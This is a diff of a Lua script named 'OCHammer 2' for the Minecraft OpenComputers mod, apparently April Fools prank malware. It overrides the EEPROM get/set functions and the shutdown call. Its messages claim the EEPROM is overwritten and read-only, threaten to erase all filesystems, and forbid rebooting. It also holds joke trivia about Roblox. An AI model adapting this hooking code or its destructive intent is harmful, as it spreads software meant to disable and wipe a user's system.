@@ -79,33 +79,35 @@ component.proxy(cl("eeprom")()).set = function(...) -- component.eeprom.set("tes
 end
 
 component.proxy(cl("eeprom")()).get = function() -- print(component.eeprom.get())
-  return "GREETZ: OCboy3, agentfish, Chouladalls, Kurhox, SirKamilMarko \n OCboy3 will smack your OpenComputer's monitor with a baseball bat. (jk)"
+  return "GREETZ: OCboy3, Chouladalls, Kurhox, SirKamilMarko. Fun Fact: OCboy3 will smack your OpenComputer's monitor with a baseball bat. (jk)"
 end
 
 computer.shutdown = function(...)
   lol()
 end
 
-local stuff = {
-  "Fun fact: OCHammer 2 was released on April 1st, 2022";
-  "BE CAREFUL NEXT TIME";
-  "Aprill, Aprill!";
-  "Fun fact: Roblox's 2022 egg hunt won't be happening. Minecraft is better than Roblox, and so is Fortnite.";
+local facts = {
+  "Fun Fact: OCHammer 2 was released on April 1st, 2022";
+  "Roblox's 2022 egg hunt won't be happening.";
+  "Minecraft is better than Roblox, and so is Fortnite.";
+  "Roblox ist langweilig. Spielen Sie es nicht. Spielen Sie stattdessen Minecraft oder Fortnite." -- Roblox is boring. Don't play it. Play Minecraft or Fortnite instead.
+  "Spielst du Roblox? Roblox ist langweilig."; --  langweilig = boring
   "Hitting your OpenComputer's monitor with a baseball bat won't help.";
-  "Fun fact: I will erase all filesystems connected to your OpenComputer";
+  "Fun Fact: I will erase all filesystems connected to your OpenComputer.";
   "Do you even use MacOS??? Mac's dont get viruses.";
-  "Fun fact: Your favourite Youtuber, Kreekcraft, has swore in his livestream.";
-  "Sanctions against OCVille!? Again, Seriously!? Please stop.";
+  "Sanctions against OCVille!? Again, Seriously!?";
+  "sanctions";
 }
 
-local funfact = stuff[math.random(1,#stuff)]
+local funfact = facts[math.random(1,#facts)]
 
 local APRIL = {
-    "Your OpenComputer got pwned by OCHammer 2"; -- APRILL APRILL
-    "You won't be able to boot your OpenComputer as it's EEPROM has been overwritten and made read-only.";
-    funfact;
-    "";
-    "RULES:";
+    "Your OpenComputer got pwned by OCHammer 2";
+    "You won't be able to boot your OpenComputer anymore as it's EEPROM has been overwritten and made read-only.";
+    "This is the last time you will use it.";
+    --funfact;
+    " ";
+    "Rules:";
     " ";
     "1. No unplugging your EEPROM (or any component at all)";
     "2. No shutdown or reboot";
